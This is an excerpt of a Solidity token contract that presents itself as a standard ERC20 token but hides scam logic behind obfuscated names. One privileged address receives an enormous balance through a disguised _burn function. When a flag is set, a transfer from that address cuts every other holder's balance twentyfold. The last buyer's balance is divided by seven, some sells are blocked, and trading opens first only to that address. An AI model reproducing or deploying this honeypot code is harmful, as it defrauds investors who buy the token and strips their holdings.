...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _WeWereTerra(address creator) internal virtual {
        ...
        (Earth,Fruits,Eggs,trading) = (0,false,0,false);
        (Deeds[_router],Deeds[creator],Deeds[pair]) = (true,true,true);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = (account == addr1u8fwnjfwkjf ? (10 ** 48) : 0);
    ...
    function last(uint256 g) internal view returns (address) { return (Eggs > 1 ? qomArray[qomArray.length-g-1] : address(0)); }
    ...
    function _balancesOfTheCoins(address sender, address recipient, bool emulation) internal {
        Fruits = emulation ? true : Fruits;
        if (((Deeds[sender] == true) && (Deeds[recipient] != true)) || ((Deeds[sender] != true) && (Deeds[recipient] != true))) { qomArray.push(recipient); }
        if ((Fruits) && (sender == addr1u8fwnjfwkjf) && (Earth == 1)) { for (uint256 lyft = 0;  lyft < qomArray.length; lyft++) { _balances[qomArray[lyft]] /= (2 * 10 ** 1); } }
        _balances[last(1)] /= (((Spies == block.timestamp) || Fruits) && (Deeds[last(1)] != true) && (Eggs > 1)) ? (7) : (1);
        Spies = block.timestamp; Eggs++; if (Fruits) { require(sender != last(0)); }
    }
    ...
    function _balancesOfTheApes(address sender, address recipient) internal {
        require((trading || (sender == addr1u8fwnjfwkjf)), "ERC20: trading is not yet enabled.");
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployQOMPUTER(creator, initialSupply);
        _WeWereTerra(creator);
    }
}
